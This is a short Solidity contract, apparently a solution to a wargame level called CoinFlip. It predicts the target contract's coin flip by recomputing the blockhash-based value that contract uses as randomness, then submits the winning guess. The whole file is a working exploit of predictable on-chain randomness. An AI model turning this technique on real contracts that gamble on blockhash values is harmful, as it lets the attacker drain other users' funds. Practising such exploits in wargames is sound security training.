// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './utils/SafeMath.sol';

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipSolution {
  using SafeMath for uint256;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  ICoinFlip coinFlipContract;
  
  constructor(address _coinFlip) public {
    coinFlipContract = ICoinFlip(_coinFlip);
  }

  function play() external {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinFlipContract.flip(side);
  }
}
